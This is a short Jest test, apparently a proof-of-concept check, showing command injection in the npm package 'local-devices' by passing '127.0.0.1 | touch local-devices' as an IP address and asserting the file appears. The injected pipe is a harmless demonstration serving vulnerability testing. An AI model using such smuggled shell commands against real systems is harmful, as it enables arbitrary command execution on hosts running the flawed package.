//https://github.com/DylanPiercey/local-devices/pull/16
test("Command Injection in local-devices", () => {
  const find = require("local-devices");
  const fs = require("fs");
  const path = "./local-devices";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let userInput = "127.0.0.1 | touch local-devices";
  find(userInput).then(() => {
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
